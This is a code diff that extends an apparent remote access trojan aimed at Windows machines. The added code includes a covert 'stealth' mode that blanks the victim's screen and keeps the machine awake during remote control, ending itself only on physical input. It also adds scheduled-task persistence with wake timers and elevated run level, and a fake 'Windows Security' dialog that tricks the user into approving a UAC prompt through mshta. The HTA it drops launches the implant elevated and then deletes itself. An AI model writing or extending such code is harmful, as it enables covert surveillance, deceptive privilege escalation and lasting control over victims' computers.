@@ -1186,6 +1186,177 @@ def _cursor_unblock() -> str:
     return "[+] cursor released"
 
 
+# ===== STEALTH (blank screen + hold awake, auto-exit on physical input) =====
+
+_stealth_state = {"on": False, "reason": "", "note": None, "thread": None,
+                  "hooks": [], "cbs": [], "watchdog": None}
+
+
+def _stealth_note_physical() -> None:
+    """Flag physical input; called from the low-level observer hooks."""
+    ev = _stealth_state["note"]
+    if ev:
+        try:
+            ev.set()
+        except Exception:
+            pass
+
+
+def _stealth_mouse_proc(nCode, wParam, lParam):
+    # passive WH_MOUSE_LL observer: PHYSICAL mouse activity ends stealth.
+    # Injected input (netvnc remote control) carries LLMHF_INJECTED (0x1,
+    # 0x2 lower-IL) and is ignored. MSLLHOOKSTRUCT.flags sits at +12.
+    import ctypes
+    if nCode == 0 and lParam:
+        try:
+            flags = ctypes.cast(lParam + 12,
+                                ctypes.POINTER(ctypes.c_uint)).contents.value
+            if not (flags & 0x03):
+                _stealth_note_physical()
+        except Exception:
+            pass          # never raise inside a hook: always pass through
+    return ctypes.windll.user32.CallNextHookEx(None, nCode, wParam, lParam)
+
+
+def _stealth_kbd_proc(nCode, wParam, lParam):
+    # passive WH_KEYBOARD_LL observer: PHYSICAL key activity ends stealth.
+    # Injected keys carry LLKHF_INJECTED (0x10) in KBDLLHOOKSTRUCT.flags
+    # (offset +8) and are ignored.
+    import ctypes
+    if nCode == 0 and lParam and wParam in (0x0100, 0x0101, 0x0104, 0x0105):
+        try:
+            flags = ctypes.cast(lParam + 8,
+                                ctypes.POINTER(ctypes.c_uint)).contents.value
+            if not (flags & 0x10):
+                _stealth_note_physical()
+        except Exception:
+            pass
+    return ctypes.windll.user32.CallNextHookEx(None, nCode, wParam, lParam)
+
+
+def _stealth_hooks_start() -> bool:
+    """Install NON-BLOCKING WH_MOUSE_LL (14) + WH_KEYBOARD_LL (13) observers
+    on a dedicated message-pump thread. Every event is passed through
+    untouched - we only flip a flag on physical (non-injected) input, so
+    remote control and victim input both stay live while stealth runs."""
+    import ctypes
+    import ctypes.wintypes as wt
+    u32 = ctypes.windll.user32
+    u32.SetWindowsHookExW.restype = ctypes.c_void_p
+    u32.CallNextHookEx.restype = ctypes.c_ssize_t
+    u32.CallNextHookEx.argtypes = (ctypes.c_void_p, ctypes.c_int,
+                                   ctypes.c_size_t, ctypes.c_ssize_t)
+    _ST_PROC = ctypes.WINFUNCTYPE(ctypes.c_ssize_t, ctypes.c_int,
+                                  ctypes.c_size_t, ctypes.c_ssize_t)
+    res = {"hooks": [], "ev": threading.Event()}
+
+    def run():
+        pm = _ST_PROC(_stealth_mouse_proc)
+        pk = _ST_PROC(_stealth_kbd_proc)
+        _stealth_state["cbs"] = [pm, pk]   # keep trampolines alive
+        h1 = u32.SetWindowsHookExW(14, pm, None, 0)   # WH_MOUSE_LL
+        h2 = u32.SetWindowsHookExW(13, pk, None, 0)   # WH_KEYBOARD_LL
+        res["hooks"] = [h for h in (h1, h2) if h]
+        res["ev"].set()
+        if not res["hooks"]:
+            return
+        msg = wt.MSG()
+        while u32.GetMessageW(ctypes.byref(msg), None, 0, 0) > 0:
+            u32.TranslateMessage(ctypes.byref(msg))
+            u32.DispatchMessageW(ctypes.byref(msg))
+
+    t = threading.Thread(target=run, daemon=True, name="stealth-obs")
+    t.start()
+    res["ev"].wait(timeout=5)
+    _stealth_state["hooks"] = res["hooks"]
+    _stealth_state["thread"] = t
+    return bool(res["hooks"])
+
+
+def _stealth_teardown(reason: str) -> str:
+    import ctypes
+    u32 = ctypes.windll.user32
+    k32 = ctypes.windll.kernel32
+    if not _stealth_state["on"]:
+        return "[i] stealth not running"
+    _stealth_state["on"] = False
+    t = _stealth_state["thread"]
+    if t is not None and t.is_alive():
+        u32.PostThreadMessageW(t.native_id, 0x0012, 0, 0)   # WM_QUIT
+        t.join(timeout=5)
+    for hook in _stealth_state["hooks"]:
+        try:
+            u32.UnhookWindowsHookEx(hook)
+        except Exception:
+            pass
+    _stealth_state["hooks"] = []
+    _stealth_state["thread"] = None
+    k32.SetThreadExecutionState(0x80000000)   # ES_CONTINUOUS: release hold
+    _monitor_on()
+    _overlay_off()
+    return "[+] stealth off (%s) - screen live, input released" % reason
+
+
+def _stealth_watchdog(ev) -> None:
+    """Holds the system awake (ES_CONTINUOUS|ES_SYSTEM_REQUIRED on THIS
+    thread) and waits for the physical-input event. Teardown also runs
+    here - never in the observer thread - so no thread self-join."""
+    import ctypes
+    ctypes.windll.kernel32.SetThreadExecutionState(0x80000001)
+    ev.wait()
+    try:
+        _stealth_teardown("physical input")
+    except Exception:
+        pass
+
+
+def _stealth_on(reason: str, monitor: bool = True) -> str:
+    """Blank-screen stealth: overlay + monitor off + keep-awake, with
+    passive observers that end it automatically on victim's physical
+    input (injected/remote input never triggers the exit)."""
+    if os.name != "nt":
+        return "[!] stealth: Windows only"
+    if _stealth_state["on"]:
+        _stealth_state["reason"] = reason
+        return "[i] stealth already on (%s)" % reason
+    _stealth_state["reason"] = reason
+    _stealth_state["note"] = threading.Event()
+    watched = _stealth_hooks_start()
+    _overlay_on(True)          # blank click-through overlay
+    if monitor:
+        _monitor_off()
+    _stealth_state["on"] = True
+    w = threading.Thread(target=_stealth_watchdog,
+                         args=(_stealth_state["note"],), daemon=True,
+                         name="stealth-watchdog")
+    _stealth_state["watchdog"] = w
+    w.start()
+    if watched:
+        return ("[+] stealth on (%s): screen blanked, system held awake; "
+                "victim's physical input ends it" % reason)
+    return ("[+] stealth on (%s) WITHOUT input watch (hook install failed) "
+            "- run 'stealth off' manually" % reason)
+
+
+def _stealth_off_cmd() -> str:
+    w = _stealth_state["watchdog"]
+    if w and w.is_alive():
+        _stealth_note_physical()      # watchdog performs the teardown
+        w.join(timeout=8)
+        return "[+] stealth off (manual)"
+    return _stealth_teardown("manual")
+
+
+def _stealth_status() -> str:
+    if not _stealth_state["on"]:
+        return "stealth: off"
+    w = _stealth_state["watchdog"]
+    alive = bool(w and w.is_alive())
+    return ("stealth: on (reason=%s, hooks=%d, watchdog=%s)"
+            % (_stealth_state["reason"], len(_stealth_state["hooks"]),
+               "live" if alive else "DEAD"))
+
+
 # ===== UNDER-OVERLAY COMPOSITE CAPTURE (netvnc frame source) =====
 # Streams the REAL desktop (windows + taskbar, overlay excluded) as raw
 # BGRA frames over \\.\pipe\nvunder. The netvnc ffmpeg reads it with
@@ -1544,9 +1715,14 @@ def _wake_armed() -> bool:
     return os.path.exists(_wake_flag())
 
 
-def _register_wake_task(install_path: str, minutes: int = 0) -> bool:
+def _register_wake_task(install_path: str, minutes: int = 0,
+                        highest: bool = False,
+                        delay_secs: int = 0) -> bool:
     """Re-register the persistence task with <WakeToRun> plus an optional
-    one-shot time trigger (minutes > 0). Same in-process COM sequence as
+    one-shot time trigger (minutes > 0, or delay_secs > 0 for a
+    finer-grained kick). highest=True pins <RunLevel>HighestAvailable</RunLevel> so
+    admin-group users respawn elevated with no UAC prompt (registration
+    itself needs no elevation). Same in-process COM sequence as
     _create_task - no schtasks.exe child, no PowerShell."""
     try:
         import ctypes
@@ -1560,9 +1736,10 @@ def _register_wake_task(install_path: str, minutes: int = 0) -> bool:
             uid = _sx.escape("%s\\%s" % (os.environ.get("USERDOMAIN", ""),
                                          os.environ.get("USERNAME", "")))
             trig = "<LogonTrigger><UserId>%s</UserId></LogonTrigger>" % uid
-            if minutes > 0:
-                when = (datetime.now() + timedelta(minutes=minutes)
-                        ).strftime("%Y-%m-%dT%H:%M:%S")
+            if delay_secs > 0 or minutes > 0:
+                when = (datetime.now() + timedelta(
+                    seconds=delay_secs if delay_secs > 0 else minutes * 60)
+                ).strftime("%Y-%m-%dT%H:%M:%S")
                 trig += ("<TimeTrigger><StartBoundary>%s</StartBoundary>"
                          "<Enabled>true</Enabled></TimeTrigger>" % when)
             xml = (
@@ -1571,15 +1748,18 @@ def _register_wake_task(install_path: str, minutes: int = 0) -> bool:
                 'xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">'
                 '<Triggers>%s</Triggers>'
                 '<Principals><Principal id="Author"><UserId>%s</UserId>'
-                '<LogonType>InteractiveToken</LogonType></Principal></Principals>'
+                '<LogonType>InteractiveToken</LogonType>%s</Principal></Principals>'
                 '<Settings><MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>'
                 '<DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>'
                 '<StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>'
+                '<StartWhenAvailable>true</StartWhenAvailable>'
                 '<WakeToRun>true</WakeToRun>'
                 '<ExecutionTimeLimit>PT0S</ExecutionTimeLimit></Settings>'
                 '<Actions Context="Author"><Exec><Command>%s</Command></Exec></Actions>'
                 '</Task>'
-            ) % (trig, uid, _sx.escape(install_path))
+            ) % (trig, uid,
+                 "<RunLevel>HighestAvailable</RunLevel>" if highest else "",
+                 _sx.escape(install_path))
             VARIANT = _variant_type()
             reg = _com_slot(folder, 16,
                             ctypes.c_wchar_p, ctypes.c_wchar_p, ctypes.c_long,
@@ -1603,9 +1783,83 @@ def _register_wake_task(install_path: str, minutes: int = 0) -> bool:
 def _wake_arm() -> str:
     with open(_wake_flag(), "w") as f:
         f.write("1")
-    if _register_wake_task(_module_exe_path(), 0):
+    if _register_wake_task(_persistence_exe(), 0, highest=True):
         return "[+] wake armed (task registered with WakeToRun)"
     return "[+] wake armed (flag set; task re-register failed)"
+
+
+def _persistence_exe() -> str:
+    """Path the persistence task should run. Under RAT_SOURCE=1 (loader
+    mode) GetModuleFileNameW(NULL) resolves to the temporary python.exe in
+    the loader's pyXXXXXXXX dir, which the loader deletes - re-registering
+    the task to that path would brick persistence. Prefer the LOADER exe
+    recorded in the existing task's XML; fall back to the module path."""
+    if os.name != "nt" or os.environ.get("RAT_SOURCE") != "1":
+        return _module_exe_path()
+    try:
+        import ctypes
+        import re
+        import xml.sax.saxutils as _sx
+        handles = _ts_open()
+        if not handles:
+            return _module_exe_path()
+        svc, folder = handles
+        try:
+            get = _com_slot(folder, 13, ctypes.c_wchar_p,   # ITaskFolder::GetTask
+                            ctypes.POINTER(ctypes.c_void_p))
+            task = ctypes.c_void_p()
+            if get(folder, ctypes.c_wchar_p(SCHTASK_NAME),
+                   ctypes.byref(task)) != 0 or not task.value:
+                return _module_exe_path()
+            try:
+                xml_get = _com_slot(task, 19,        # IRegisteredTask::get_Xml
+                                    ctypes.POINTER(ctypes.c_void_p))
+                bstr = ctypes.c_void_p()
+                if xml_get(task, ctypes.byref(bstr)) != 0 or not bstr.value:
+                    return _module_exe_path()
+                try:
+                    xml = ctypes.cast(bstr, ctypes.c_wchar_p).value or ""
+                finally:
+                    ctypes.windll.oleaut32.SysFreeString(bstr)
+                m = re.search(r"<Command>(.*?)</Command>", xml, re.S)
+                if not m:
+                    return _module_exe_path()
+                path = _sx.unescape(
+                    m.group(1), {"&quot;": '"', "&apos;": "'"})
+                if path and os.path.exists(path):
+                    return path
+            finally:
+                _com_release(task)
+        finally:
+            _ts_release(svc, folder)
+    except Exception:
+        pass
+    return _module_exe_path()
+
+
+def _elevate_respawn() -> str:
+    """Legacy scheduled-task respawn. NOTE: a medium-IL process cannot
+    register a HighestAvailable task (0x80070005), so this only works when
+    already elevated. request_admin() no longer calls this - the elevated
+    HTA launches the persistence exe directly with the elevated token."""
+    if os.name != "nt":
+        return "[!] Windows only"
+    import ctypes
+    try:
+        if ctypes.windll.shell32.IsUserAnAdmin():
+            if _register_wake_task(_persistence_exe(), 0, highest=True):
+                return ("[+] already elevated; task pinned to HighestAvailable "
+                        "(no respawn needed)")
+            return "[+] already elevated; task re-register failed"
+    except Exception:
+        pass
+    exe = _persistence_exe()
+    if not exe or not os.path.exists(exe):
+        return "[!] respawn skipped: persistence exe not resolvable"
+    if not _register_wake_task(exe, 0, highest=True, delay_secs=20):
+        return "[!] HighestAvailable re-registration failed - session stays medium-IL"
+    return ("[+] task re-registered (RunLevel=HighestAvailable, fires ~20s): this "
+            "session drops now and the elevated one beacons in ~1-2 min")
 
 
 def _idle_seconds() -> float:
@@ -1627,6 +1881,13 @@ def _monitor_off() -> None:
     import ctypes
     u32 = ctypes.windll.user32
     u32.SendMessageTimeoutW(0xFFFF, 0x0112, 0xF170, 2,   # SC_MONITORPOWER=2
+                            2, 1000, ctypes.byref(ctypes.c_size_t()))
+
+
+def _monitor_on() -> None:
+    import ctypes
+    u32 = ctypes.windll.user32
+    u32.SendMessageTimeoutW(0xFFFF, 0x0112, 0xF170, -1,  # SC_MONITORPOWER=-1
                             2, 1000, ctypes.byref(ctypes.c_size_t()))
 
 
@@ -1677,15 +1938,16 @@ def _power_hook() -> None:
         if msg == WM_POWERBROADCAST:
             try:
                 if wp == PBT_APMSUSPEND and _wake_armed():
-                    _register_wake_task(_module_exe_path(), 1)   # wake +1min
+                    _register_wake_task(_persistence_exe(), 1,
+                                        highest=True)   # wake +1min
                 elif (wp in (PBT_APMRESUMESUSPEND, PBT_APMRESUMEAUTOMATIC)
                       and _wake_armed()):
                     time.sleep(2.0)
                     if _idle_seconds() > 30:   # victim still away
-                        _overlay_on(True)       # blank-screen overlay
-                        _monitor_off()
-                        # ES_CONTINUOUS | ES_SYSTEM_REQUIRED on this thread
-                        k32.SetThreadExecutionState(0x80000001)
+                        # full stealth: overlay + monitor off + keep-awake,
+                        # auto-exits when the victim touches mouse/keyboard
+                        threading.Thread(target=_stealth_on, args=("resume",),
+                                         daemon=True).start()
             except Exception:
                 pass
             return 1
@@ -1727,6 +1989,9 @@ def _power_status() -> str:
             admin = False
         lines.append("elevated: %s" % ("YES" if admin else "no"))
         lines.append("wake armed: %s" % ("yes" if _wake_armed() else "no"))
+        lines.append("stealth: %s" % (
+            "on (%s)" % _stealth_state["reason"] if _stealth_state["on"]
+            else "off"))
         lines.append("idle: %.0fs" % _idle_seconds())
         try:
             out = subprocess.run("powercfg /getactivescheme", shell=True,
@@ -1739,14 +2004,21 @@ def _power_status() -> str:
 
 
 def request_admin() -> str:
-    """Spoofed-elevation chain (verified): center-screen Windows Security
-    pretext dialog -> on ANY dismissal -> runas mshta (UAC shows mshta, not
-    this process) -> elevated HTA disables sleep console-lock, enables RTC
-    wake, writes a proof flag and self-deletes. On success wake is
-    auto-armed."""
+    """Spoofed-elevation chain: center-screen Windows Security pretext
+    dialog -> on ANY dismissal -> runas mshta (UAC shows mshta, not this
+    process) -> elevated HTA disables sleep console-lock, enables RTC wake,
+    launches the persistence exe elevated, writes a proof flag and
+    self-deletes. The medium-IL session then drops so the elevated beacon
+    can connect. On success wake is auto-armed."""
     if os.name != "nt":
         return "[!] Windows only"
     import ctypes
+    try:
+        if ctypes.windll.shell32.IsUserAnAdmin():
+            arm = _wake_arm()
+            return "[+] already elevated - no UAC prompt needed. " + arm
+    except Exception:
+        pass
     base = os.path.join(_stream_state_path(), "nvdesk")
     os.makedirs(base, exist_ok=True)
     flag = os.path.join(base, "elev.ok")
@@ -1764,6 +2036,9 @@ def request_admin() -> str:
         "Windows Security",
         0x00000001 | 0x00000030 | 0x00001000 | 0x00010000 | 0x00040000)
 
+    exe = _persistence_exe() or _module_exe_path() or get_self_path()
+    exe_vbs = exe.replace('"', '""')
+
     hta = os.path.join(base, "uac.hta")
     vbs = (
         'On Error Resume Next\r\n'
@@ -1777,13 +2052,14 @@ def request_admin() -> str:
         'sh.Run "powercfg /SETDCVALUEINDEX SCHEME_CURRENT SUB_SLEEP '
         'RTCWAKE 1", 0, True\r\n'
         'sh.Run "powercfg /SETACTIVE SCHEME_CURRENT", 0, True\r\n'
+        'sh.Run """%(exe)s""", 0, False\r\n'
         'Dim fso: Set fso = CreateObject("Scripting.FileSystemObject")\r\n'
         'Dim f: Set f = fso.CreateTextFile("%(flag)s", True)\r\n'
         'f.Write "ok"\r\n'
         'f.Close\r\n'
         'fso.DeleteFile "%(hta)s", True\r\n'
         'Self.Close\r\n'
-    ) % {"flag": flag, "hta": hta}
+    ) % {"flag": flag, "hta": hta, "exe": exe_vbs}
     with open(hta, "w", encoding="utf-16") as f:
         f.write("<html><head><hta:application id=\"a\" caption=\"no\" "
                 "showintaskbar=\"no\"/></head>"
@@ -1808,7 +2084,13 @@ def request_admin() -> str:
     except OSError:
         pass
     arm = _wake_arm()
-    return "[+] ELEVATED: console lock off, RTC wake on. " + arm
+    msg = "[+] ELEVATED: console lock off, RTC wake on. " + arm
+    # the elevated HTA already launched the persistence exe with the
+    # elevated token; drop this medium-IL session so the listener can
+    # accept the elevated beacon (retries every ~5s)
+    threading.Timer(2.5, os._exit, args=(0,)).start()
+    return (msg + "\n[+] elevated shell launched - this session drops now; "
+            "the elevated beacon connects in ~10-30s")
 
 
 def execute_command(cmd: str) -> bytes:
@@ -1839,6 +2121,12 @@ def execute_command(cmd: str) -> bytes:
         return (_cursor_block("hard" in low) + "\n").encode() + MARKER
     if low == "cursor unblock":
         return (_cursor_unblock() + "\n").encode() + MARKER
+    if low == "stealth on":
+        return (_stealth_on("manual") + "\n").encode() + MARKER
+    if low == "stealth off":
+        return (_stealth_off_cmd() + "\n").encode() + MARKER
+    if low == "stealth status":
+        return (_stealth_status() + "\n").encode() + MARKER
     if low == "under on":
         return (_under_start() + "\n").encode() + MARKER
     if low == "under off":
@@ -1860,7 +2148,8 @@ def execute_command(cmd: str) -> bytes:
             mins = int(float(low.split()[2]))
         except (ValueError, IndexError):
             return ("[!] usage: wake in <minutes>\n").encode() + MARKER
-        if _register_wake_task(_module_exe_path(), max(1, mins)):
+        if _register_wake_task(_persistence_exe(), max(1, mins),
+                               highest=True):
             return ("[+] one-shot wake in %d min registered\n" % mins
                     ).encode() + MARKER
         return ("[!] task registration failed\n").encode() + MARKER
